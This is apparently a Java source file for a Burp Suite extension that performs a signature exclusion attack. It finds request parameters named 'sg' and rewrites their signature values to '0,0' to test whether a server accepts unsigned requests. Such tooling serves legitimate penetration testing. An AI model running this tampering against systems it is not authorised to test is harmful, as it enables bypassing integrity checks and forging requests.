package burp;

import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import java.io.PrintWriter;

import java.net.URL;
import java.util.List;
import java.io.*;
import java.util.*;
import java.lang.*;
import java.util.regex.*;
import java.nio.charset.StandardCharsets;

public class SignatureExcl {

    private static PrintWriter stdout;
    private final IBurpExtenderCallbacks callbacks;
    private final IExtensionHelpers helpers;
    private IHttpRequestResponse requestResponse;
    private IRequestInfo requestInfo;
    private int diff = 0;
    private boolean flag = false;

    public SignatureExcl(IBurpExtenderCallbacks callbacks, IHttpRequestResponse message){

        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.requestResponse = message;
        this.requestInfo = helpers.analyzeRequest(message);
        this.stdout = new PrintWriter(callbacks.getStdout(), true);


    }


    public void signatureAttack(){
        stdout.println("inside sign excl");


//        String request = new String(requestResponse.getRequest());
//        String messageBody = request.substring(requestInfo.getBodyOffset());
//        byte[] updateMessage = helpers.buildHttpMessage(requestInfo.getHeaders(), messageBody.getBytes());
//        requestResponse.setRequest(updateMessage);

        List headers = requestInfo.getHeaders();
        headers.add("Test: BurpExHeader");
        String request = new String(requestResponse.getRequest());
        String messageBody = request.substring(requestInfo.getBodyOffset());
        stdout.println(requestInfo.getUrl());
        stdout.println(messageBody);
        for (IParameter param : requestInfo.getParameters()) {
            // parameter with empty signature
            if (param.getName().matches("sg")) {
                stdout.println("Entered");
                requestResponse.setHighlight("red");
                flag = true;
            }
        }

        if(flag) {
            Matcher m = Pattern.compile("(?=(sg))").matcher(messageBody);
            List<Integer> pos = new ArrayList<Integer>();
            while (m.find()) {
                pos.add(m.start());
            }
            stdout.println(pos);
            for(int n:pos) {
                messageBody = modifyString(messageBody, (n-diff));
            }
            stdout.println("Performing Signature exclusion attack");
            stdout.println(messageBody);
            stdout.println(requestInfo.getUrl());
            byte[] updateMessage = helpers.buildHttpMessage(requestInfo.getHeaders(), messageBody.getBytes());
            requestResponse.setRequest(updateMessage);

            stdout.println(requestResponse.getResponse());
        }
    }

    public String modifyString(String msgStr, int indexStart){
        String values = "0,0";
        String tempStr = msgStr.substring(0,indexStart+5);
        String truncatedStr = msgStr.substring(indexStart+6);
        int y = truncatedStr.indexOf("]");
        String remainStr = truncatedStr.substring(y);
        tempStr = tempStr.concat(values).concat(remainStr);
        diff = msgStr.length() - tempStr.length();
        return tempStr;
    }



}